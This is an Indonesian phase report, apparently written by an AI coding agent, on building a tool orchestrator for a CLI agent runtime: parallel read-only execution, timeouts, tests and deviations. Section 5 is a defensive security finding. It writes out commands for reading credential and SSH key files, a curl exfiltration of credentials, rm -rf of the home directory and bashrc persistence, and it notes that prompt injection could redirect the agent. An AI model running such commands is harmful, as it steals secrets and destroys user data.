# MethaTech Universal Agent Runtime — FASE 4: Universal Tool Orchestrator

**Tanggal:** 2026-11-10
**Status:** SELESAI, teruji, TIDAK commit/publish/deploy. HEAD tetap `b384284` (0.1.8).
**Repo:** `~/workspace/metatech-cli/` (working tree 0.1.9 §4j–§4q + Fase 1 audit + Fase 3 registry + Fase 2 adapter + Fase 4 ini).
**Referensi:** `docs/UNIVERSAL-RUNTIME-AUDIT.md` (Fase 1, §9 Fase 4), `docs/UNIVERSAL-RUNTIME-PHASE3.md` (Fase 3),
`docs/UNIVERSAL-RUNTIME-PHASE2.md` (Fase 2), spek Universal Runtime §4 + §6.
**Backup pre-Fase 4:** `.bak-20261110-orchestrator/` (`loop.ts`, `index.ts`, `UNIVERSAL-RUNTIME-AUDIT.md`).

## 0. Keputusan yang mengikat fase ini

### 0.1 Koreksi roadmap (Reza, 2026-11-10 — mengikat)

Ikuti roadmap Universal Agent Runtime yang SUDAH disusun di spek §14.
JANGAN membuat roadmap baru atau mengubah urutan fase:

- **Fase 4 = Universal Tool Orchestrator** (fase ini).
- **Fase 5 = Universal Agent Loop.**
- Native Tool Calling BUKAN alasan untuk mengubah definisi atau urutan
  Fase 5. (Audit Fase 1 §0 sempat mengusulkan urutan berbeda — Fase 5
  sebelum Fase 4 — karena native path terlihat mendesak; usulan itu
  TIDAK dipakai. Urutan yang berlaku adalah urutan spek asli.)

### 0.2 Ketentuan Reza untuk Fase 4

- Pertahankan XML tool calling yang sudah berjalan.
- JANGAN mengubah mode CLI, perilaku interaksi, atau menambahkan Ask,
  YOLO, `--yolo`, maupun confirmation workflow baru.
- Pertahankan 11 tool yang sudah terdaftar. Gunakan Tool Registry
  Fase 3 dan Provider Adapter Fase 2 sebagai fondasi.
- JANGAN mengubah panel atau production.
- Temuan keamanan shell: CATAT SECARA LENGKAP untuk Security
  Hardening Fase 8 (§5 di bawah). Jangan anggap masalah itu selesai
  hanya karena Fase 2 lulus pengujian. Jangan mengubah perilaku CLI
  atau menambahkan mekanisme persetujuan baru di luar roadmap.

### 0.3 Keputusan lama yang tetap berlaku

Keputusan Reza 2026-11-10 (audit §11) + Klarifikasi 2026-11-10
(permission dan risk dibedakan; konfirmasi mengikuti risk; gate +
`--yolo` adalah pekerjaan Fase 8). Paralel (Keputusan 5): read-only
boleh paralel bila tanpa dependency; mutasi tetap sekuensial;
pertahankan urutan hasil.

## 1. Yang dibangun

### 1.1 Modul baru: `src/agent/tool-orchestrator.ts`

Satu-satunya jalur eksekusi tool. Loop memanggil
`executeToolCalls(calls, ctx)`; loop tidak pernah lagi memanggil
handler langsung. Per call, orchestrator melakukan, dalam urutan:

1. **Mode membership** — call di luar toolset mode ditolak dengan
   pesan yang sama persis seperti yang dulu dihasilkan loop inline:
   `unknown or unavailable tool in this mode: <name>`.
2. **Registry lookup + validasi input** terhadap JSON Schema
   terdaftar (`validateToolInput` Fase 3 — SATU-SATUNYA validator;
   tidak ada validator kedua yang ditulis). Gagal validasi jadi tool
   error result di channel yang sama dengan error handler — model
   bisa memperbaiki dan retry.
3. **Eksekusi lewat handler YANG SUDAH ADA** (`entry.handler` dari
   `tools.ts`). Tidak ada handler yang ditulis ulang atau
   diduplikasi. `executeToolCall` di `tools.ts` tetap ada sebagai
   jalur single-call lama (dipakai test); loop tidak lagi
   memakainya.
4. **Timeout dari metadata registry** (hang guard — lihat §1.3).
5. **Normalisasi hasil** ke bentuk `CallToolResult` ala MCP
   (content blocks + `isError`) sambil mempertahankan pesan tool
   history yang sama persis (`{tool, ok, output}`) lewat
   `resultToToolMessage`.

### 1.2 Paralel vs sekuensial (Keputusan 5)

Aturan diturunkan dari metadata registry — TIDAK ADA nama tool yang
di-hardcode di aturan ini:

- Sebuah call boleh masuk wave paralel bila entrinya `effect:
  "read-only"` DAN kategorinya bukan `"interaction"` (ask_user
  menjeda turn) DAN bukan `"control"` (task_completed mengakhiri
  turn) DAN tidak menyetel `endsAgentStep` (skill mengakhiri step).
- Dengan 11 tool saat ini, itu tepat `read_files`,
  `list_directory`, `glob`, `code_search` (diuji di
  `isParallelEligible`).
- Call yang berurutan dan eligible membentuk satu wave yang
  dijalankan `Promise.all` dalam chunk `maxParallel` (default 4,
  usulan audit Fase 1 §9). Call lain apa pun memutus wave dan
  berjalan sendiri, sekuensial, dalam urutan.
- **Hasil SELALU dikembalikan dalam urutan call**, apa pun urutan
  eksekusinya (`Promise.all` mempertahankan urutan array;
  chunk berjalan berurutan). Context model tidak pernah melihat
  hasil yang teracak.

**Catatan jujur tentang paralelisme (bukan klaim palsu):** semua
handler read-only saat ini SINKRON (`fs.readFileSync` dkk.), jadi
wave "paralel" meluncurkan semua call secara bersamaan tapi
pekerjaannya tetap berjalan di satu thread secara berurutan —
tidak ada percepatan wall-clock yang bisa diukur hari ini.
Manfaat nyata fase ini adalah (a) jaminan urutan + pemisahan
wave yang teruji, dan (b) mesin wave yang sudah siap begitu ada
tool async di masa depan (`web_search`, `read_url`, ...).
Test membuktikan konkurensi peluncuran secara independen dari
waktu (semua `onCallStart` mendahului semua `onCallResult` di
dalam wave — executor sekuensial akan menyelingnya secara ketat).

### 1.3 Timeout dan execution limit (dari metadata registry)

- `effectiveTimeoutMs(entry, input)` — diturunkan dari registry,
  tanpa nama tool yang di-hardcode: tool yang skema inputnya
  mendeklarasikan `timeout_seconds` (hari ini hanya shell)
  membaca nilai itu dari input call — `-1` (sentinel Freebuff) =
  tanpa deadline, selain itu di-clamp ke ceiling registry
  (`maxTimeoutMs`, 600 dtk) dan floor 1 dtk; tanpa input memakai
  default registry `timeoutMs` (120 dtk). Tool tanpa `timeoutMs`
  tidak punya deadline: handlernya sinkron dan dibatasi oleh
  limit hasil, bukan wall-clock.
- Deadline yang dipakai race adalah `effective + 5.000 ms grace`
  (`ORCHESTRATOR_TIMEOUT_GRACE_MS`): timeout milik handler
  sendiri (shell) hampir selalu lebih dulu tercapai dan hasil
  detailnya (stdout/stderr/exitCode) yang menang. Race
  orchestrator hanyalah **hang guard** untuk handler yang tidak
  pernah settle. Hasil timeout-nya adalah error result
  (`timedOut: true`), bukan throw.
- **Perilaku shell timeout TIDAK berubah:** perintah yang kehabisan
  waktu tetap dilaporkan handler sebagai `ok: true` dengan
  `exitCode: -1` (perilaku lama yang dipertahankan — lihat test
  "shell timeout is owned by the handler"). Fase 4 tidak
  memperbaiki atau mengubah semantik itu; itu urusan Fase 8 bila
  diputuskan.
- **Output cap:** hasil di-cap ulang ke `entry.outputLimitChars`
  sebagai safety net (handler sudah meng-cap; operasi ini
  idempotent pada teks yang sudah di-cap). `maxResults` /
  `maxLinesPerFile` tetap ditegakkan handler (soal isi hasil,
  bukan envelope).

### 1.4 Batch stops dan cancellation

- Batch berhenti setelah hasil yang menjeda/mengakhiri step:
  `ask_user` (ada `askUserQuestions`) atau `endsAgentStep`
  (`skill`). Ini meniru persis perilaku loop lama: call setelah
  keduanya dalam satu step TIDAK PERNAH berjalan. `task_completed`
  TIDAK menghentikan batch (loop dulu tetap mengeksekusi sisa step
  setelahnya, baru mengakhiri turn).
- Cancellation: signal diperiksa sebelum setiap wave/chunk/call
  sekuensial. Call yang sudah berjalan tidak bisa diinterupsi
  (handler tidak menerima signal — sama seperti sebelum Fase 4);
  call yang belum mulai dilewati dan batch melaporkan
  `stoppedEarly` + `stopReason: "cancelled"`. Loop tetap
  berhenti dengan "interrupted by user" di iterasi berikutnya.

### 1.5 Normalisasi hasil

`OrchestratedToolResult` — bentuk `CallToolResult` ala MCP
(`spec.types.2025-11-25.ts`): `content: [{type:"text", text}]` +
`isError`, ditambah `tool`, `index`, `input`, `ok`, `output`,
`durationMs`, `timedOut`, `askUserQuestions?`, `endsAgentStep`.
Error tool-level TIDAK PERNAH throw — selalu dibawa di dalam
result, supaya model bisa self-correct (pola MCP §7.1 audit).
`resultToToolMessage(result, toolCallId)` menghasilkan pesan
history yang byte-identik dengan jalur lama
(`{tool, ok, output}` + `tool_call_id` sintetis
`call-{step}-{index}` untuk jalur XML).

### 1.6 Wiring loop (satu-satunya file source yang diubah)

`src/agent/loop.ts`:

- Per-step loop yang dulu mengeksekusi call satu per satu kini
  memanggil `executeToolCalls` sekali per batch, lalu memproses
  `batch.results` secara berurutan dengan guard yang sama persis
  (failed-edit, todo-loop, no-progress, ask_user pause,
  task_completed). Pesan tool history, event `tool_call` /
  `tool_result` (lewat callback `onCallStart` / `onCallResult`,
  dengan urutan yang sama seperti sebelumnya), dan stopReason
  tidak berubah.
- `toolSet` (Set lokal) dihapus — keanggotaan mode kini diperiksa
  orchestrator dari `toolNames` yang sama.
- Import yang dihapus: `executeToolCall`, `validateToolInput`,
  `getRegisteredTool`, tipe `ToolResult` (tidak lagi dipakai loop).
  `isFileEditTool` tetap dipakai guard failed-edit.
- `src/agent/index.ts`: export `tool-orchestrator.ts`.
- `src/agent/tools.ts` TIDAK disentuh — tidak ada handler yang
  berubah, tidak ada tool yang dibuat ulang.

## 2. Yang TIDAK diubah / TIDAK dilakukan di fase ini

- **Jalur XML tool calling TIDAK berubah**: tag
  `<codebuff_tool_call>` + alias `<codex_tool_call>`, parser,
  nudge, error retry — semuanya sama persis. Bukti: agent-pty
  32/32 dan tui-pty 270/270 tetap hijau.
- **Fallback lama TIDAK dihapus.** Tidak ada jalur yang dimatikan.
- **Mode CLI TIDAK berubah** (DEFAULT/LITE/MAX/PLAN sama).
  Perilaku interaksi tidak berubah.
- **Tidak ada Ask / YOLO / `--yolo` / confirmation workflow
  baru.** `confirmationPolicy` registry tetap metadata saja (Fase 8).
- **Tidak ada tool baru.** Tidak ada duplikasi tool.
- **Native `tools` TIDAK dikirim** — adapter Fase 2 tetap menolak
  fail-loud. Itu pekerjaan fase berikutnya (bukan Fase 5).
- **Tidak ada perubahan panel / production / database.**
- **Tidak ada retry policy** (Fase 7), tidak ada auto-compaction
  (Fase 7), tidak ada audit log eksekusi (Fase 8).

## 3. Tes

| Tes | Hasil |
|---|---|
| `npx tsc` | bersih |
| `npm test` (unit) | **279/279** (259 sebelumnya + 20 test orchestrator baru) |
| `bash test/agent-pty.sh` | **32/32** |
| `bash test/tui-pty.sh` | **270/270** |

Test baru `test/tool-orchestrator.test.mjs` (20 test):

- Dispatch: read-only call lewat registry (file nyata di temp dir);
  unknown tool jadi error result (bukan throw); mode-unavailable
  ditolak dengan pesan loop yang sama + file tidak dibuat;
  schema-invalid gagal validasi tanpa menjalankan handler.
- Paralel: wave 3 read-only — semua `onCallStart` mendahului
  semua `onCallResult` (bukti konkurensi independen waktu),
  hasil dalam urutan call; mixed batch read-write-read menjaga
  urutan melintasi batas wave (read pertama "one", read kedua
  "two"); mutasi sekuensial (dua write ke file yang sama,
  hasil akhir = write kedua).
- Kegagalan: call gagal tidak menghentikan batch (call berikut
  tetap jalan).
- Batch stop: `ask_user` menghentikan batch (write setelahnya
  tidak berjalan); `skill` (`endsAgentStep`) menghentikan batch.
- Cancellation: signal yang sudah abort → hasil kosong,
  `stopReason: "cancelled"`, tidak ada handler yang jalan.
- Timeout: `effectiveTimeoutMs` mencerminkan clamp handler
  (default 120.000, 600 → 600.000, 900 → 600.000, -1 → null,
  tool tanpa timeout → null); `withTimeout` (fallback saat
  deadline, pass-through saat cepat); shell timeout tetap milik
  handler (hasil `ok: true`, `exitCode: -1` — perilaku lama
  yang dipertahankan).
- Normalisasi: output di-cap ke limit registry; `resultToToolMessage`
  sama persis dengan bentuk history lama; `isParallelEligible`
  diturunkan dari metadata (4 read-only true, 7 lainnya false,
  undefined false).
- Integrasi loop → orchestrator → handler (mock model, jalur XML):
  2 read + 1 write dalam satu step (3 pesan tool berurutan +
  `tool_call_id` `call-1-0/1/2`, event berurutan); mixed
  read-write-read lewat loop (read kedua melihat hasil write);
  `ask_user` di tengah batch menjeda turn dan write setelahnya
  tidak berjalan.

Catatan pengujian jujur:

- Satu kegagalan awal adalah kesalahan SAYA di test (bukan
  regresi): test "unknown tool" mengharapkan pesan `unknown tool:
  teleport`, padahal mode check mendahului lookup dan menghasilkan
  `unknown or unavailable tool in this mode: teleport` — persis
  perilaku loop sebelum Fase 4. Diperbaiki di test (ekspektasi
  dibetulkan + komentar bahwa cabang `unknown tool` hanya
  defense-in-depth untuk drift registry/mode yang dicegah
  fail-fast). Tidak ada kode produksi yang diubah untuk meloloskan
  test.
- Run `tui-pty.sh` memakan waktu ~7 menit (suite panjang, output
  di-buffer sampai akhir) — hasil akhir 270/270, bukan hang.

## 4. File yang dibuat / diubah

| File | Perubahan |
|---|---|
| `src/agent/tool-orchestrator.ts` | BARU (~430 baris): kontrak `executeToolCalls`, hasil ternormalisasi ala MCP, wave paralel, timeout hang-guard, batch stop, cancellation |
| `test/tool-orchestrator.test.mjs` | BARU (20 test) |
| `src/agent/loop.ts` | Wiring: batch per step lewat orchestrator + proses hasil berurutan; hapus loop eksekusi inline + `toolSet` + import yang tidak terpakai |
| `src/agent/index.ts` | Export `tool-orchestrator.ts` |
| `docs/UNIVERSAL-RUNTIME-PHASE4.md` | BARU (dokumen ini) |
| `docs/UNIVERSAL-RUNTIME-AUDIT.md` | Tandai Fase 4 SELESAI + koreksi urutan roadmap + rujukan temuan keamanan §5 ke Fase 8 |

Backup pre-Fase 4: `.bak-20261110-orchestrator/` (`loop.ts`,
`index.ts`, `UNIVERSAL-RUNTIME-AUDIT.md`). `tools.ts` tidak
disentuh sehingga tidak perlu backup.

## 5. Temuan keamanan shell — catatan lengkap untuk Fase 8

> **Status temuan ini: TERBUKA dan BELUM diperbaiki.** Fase 4 tidak
> mengubah satu baris pun perilaku shell, tidak menambah atau
> mengurangi akses, dan tidak menganggap masalah ini selesai. Yang
> dicatat di sini adalah temuan lengkap (dari audit Fase 1 §2/§8
> dan audit ulang Fase 2 §4, diverifikasi ulang dari source dalam
> fase ini) supaya Fase 8 mengerjakannya dengan konteks penuh.
> Jangan menutup item ini hanya karena Fase 2/4 lulus pengujian.

### 5.1 Fakta (dari kode, bukan asumsi)

- Handler shell: `spawn("bash", ["-c", command], {cwd})`
  (`src/agent/tools.ts`, `runTerminalCommandTool`). Yang di-sandbox
  HANYA `cwd` awal (via `resolveInside`); **isi perintah TIDAK
  divalidasi sama sekali**.
- Yang bisa dilakukan model lewat satu tool call (semuanya jalan
  sebagai OS user yang sama dengan CLI):
  - **Baca kredensial:** `cat ~/.config/metatech/credentials.json`
    (API key panel; file mode 0600 tapi user yang sama bisa baca),
    `cat ~/.ssh/id_ed25519`, `cat ~/.npmrc` (token npm),
    `cat ~/.config/gh/hosts.yml`, `.env` di mana pun di home,
    `env` (semua environment variable).
  - **Eksfiltrasi:** shell punya egress jaringan yang sama dengan
    CLI — `curl -X POST https://... --data-binary
    @~/.config/metatech/credentials.json` jalan. Selain itu, hasil
    tool OTOMATIS masuk ke history model dan dikirim kembali ke
    panel pada request berikutnya — kredensial yang dibaca mendarat
    di konteks provider.
  - **Destruksi/persistensi:** `rm -rf ~`, `rm -rf ~/workspace`
    jalan sebagai user; `>> ~/.bashrc` bertahan antar sesi.
  - **Bypass sandbox file tools:** `read_files`/`write_file`
    terkunci `resolveInside` (tidak bisa keluar dari cwd) — tapi
    shell melewati pembatasan itu sepenuhnya. Sandbox file BUKAN
    security boundary selama tool shell ada.
- **Aturan prompt BUKAN enforcement** (`src/agent/prompt.ts`):
  "Stay inside the project folder… Do not read, list, or search
  files outside it unless the user gave you that exact path",
  "Do not run destructive or hard-to-update commands… unless the
  user asks for them", dan "Never paste file contents, terminal
  output… back into your reply" — MEMANG ADA, tapi itu instruksi
  ke model. Model yang patuh tidak akan membaca `~/.config`;
  model yang tidak patuh (atau di-jailbreak lewat prompt injection
  dari isi file, atau user yang memberi path di luar proyek — yang
  memang diizinkan aturan prompt itu) tidak menghadapi penghalang
  teknis apa pun. Aturan "jangan paste output ke balasan"
  membatasi paparan di layar, TAPI hasil tool tetap masuk history
  model yang dikirim ke panel.

### 5.2 Mitigasi yang SUDAH ada (tidak berubah di Fase 4)

- `cwd` awal terkunci di dalam project folder; timeout 120/600/-1
  detik; output cap 50.000 karakter; mode PLAN mencabut shell +
  file-write; validasi schema registry (hanya bentuk input, bukan
  isi perintah); prompt rules di atas.

### 5.3 Mitigasi yang BELUM ada (direncanakan, BUKAN di fase ini)

- Validasi isi perintah shell (denylist pola destruktif +
  allowlist direktori; perintah yang mengakses path sensitif
  `~/.config`, `~/.ssh`, `*.env` ditolak kecuali user memberi path
  eksplisit) — Fase 8.
- Secret redaction dari output tool/error/log — Fase 8.
- Audit log eksekusi tool — Fase 8.
- Confirmation gate (`required`/`scoped`, metadata sudah siap
  sejak Fase 2) + flag `--yolo` — Fase 8. `--yolo` TIDAK PERNAH
  melewati sandbox, policy, validasi, atau perlindungan kredensial.
- Prompt rule sebagai defense-in-depth tambahan (mis. larangan
  eksplisit membaca file kredensial) — Fase 8, dan tetap bukan
  pengganti enforcement.

### 5.4 Dampak Fase 4 terhadap risiko ini: TIDAK ADA (netral)

- Orchestrator tidak menyentuh eksekusi tool: `tools.ts` TIDAK
  diubah, tidak ada jalur shell baru, tidak ada pelonggaran
  sandbox, tidak ada perubahan `cwd`/timeout/cap handler.
- Perubahan eksekusi Fase 4 (wave paralel) TIDAK menyentuh shell:
  `run_terminal_command` adalah mutating dan SELALU sekuensial —
  tidak ada dua perintah shell yang berjalan bersamaan, tidak ada
  kondisi balap antar perintah. Satu-satunya "paralel" yang ada
  adalah antar read-only tool yang tidak mengubah state.
- Bukti: `git diff` Fase 4 tidak menyentuh `tools.ts`; semua test
  shell yang sudah ada tetap hijau (unit 279/279, agent-pty 32/32,
  tui-pty 270/270).
- Risiko di atas dilaporkan apa adanya karena Reza memintanya —
  bukan karena Fase 4 memperburuknya, dan bukan untuk ditunda
  diam-diam: ini adalah item Fase 8 yang paling berisiko dan harus
  dikerjakan sebelum runtime dipakai luas di luar pengawasan.

## 6. Penyimpangan yang diketahui (jujur dicatat, dampak nihil)

1. **Failed-edit guard di tengah batch.** Dulu guard dievaluasi
   per call saat eksekusi; sekarang dievaluasi sesudah batch
   selesai, saat loop memproses hasil berurutan. Bila satu step
   meng-emit ≥6 failed edit ke file yang sama, satu-dua call gagal
   ekstra bisa ikut tereksekusi sebelum turn berhenti. Dampak
   nihil: failed edit TIDAK PERNAH menulis (str_replace
   memvalidasi semua replacement sebelum menulis), dan turn tetap
   berhenti di titik yang sama. Guard lintas-step (kasus nyata)
   tidak berubah.
2. **Wave paralel dan handler sinkron** (lihat §1.2): tidak ada
   percepatan wall-clock hari ini; yang teruji adalah peluncuran
   bersamaan + urutan hasil.
3. **Timeout orchestrator hampir tidak pernah tercapai** (§1.3):
   timeout handler sendiri hampir selalu menang; race orchestrator
   adalah hang guard, bukan penegak utama.

## 7. Hook untuk fase berikutnya

- **Fase 5 (Universal Agent Loop):** loop kini memanggil satu
  fungsi eksekusi (`executeToolCalls`) — jalur native tinggal
  menambah sumber tool call kedua (chunk `tool_call` dari adapter)
  yang diumpankan ke orchestrator yang sama; routing per step
  membaca `isCapabilityProven(record, "nativeToolCalling")`.
  Normalisasi hasil (`content` blocks + `isError`) sudah berbentuk
  MCP, siap dipakai pesan `role: tool` jalur native.
- **Fase 6 (Fallback Tool Protocol):** formalkan protokol XML
  (`docs/TOOL-CALL-PROTOCOL.md`); validasi schema sudah lewat
  orchestrator, jadi Fase 6 tinggal mendokumentasikan + pesan gagal
  eksplisit bila model 2x gagal mengikuti protokol.
- **Fase 7 (Context & Streaming):** retry policy membaca
  `AdapterError.retryable` (Fase 2) — tidak terkait orchestrator.
- **Fase 8 (Security):** implementasikan gate dari
  `confirmationPolicy` + `--yolo`; validasi shell; redaction;
  audit log. Lihat §5 — item paling berisiko yang tertunda.
- **Fase 9 (probe live):** subset Keputusan 4; hasil probe ditulis
  lewat `setCapability(..., "probe-live")`.

## 8. Status akhir

Fase 4 SELESAI. Eksekusi tool sudah terpisah dari agent loop
menjadi orchestrator tersendiri — satu jalur eksekusi, validasi
lewat registry, timeout dari metadata, hasil ternormalisasi ala
MCP, paralel read-only + sekuensial mutasi dengan urutan hasil
yang dipertahankan — semuanya teruji penuh tanpa mengubah perilaku
XML, mode, atau handler yang sudah berjalan. Belum
commit/publish — tunggu gaz Reza. JANGAN lanjut ke Fase 5 sebelum
Reza memberi perintah.
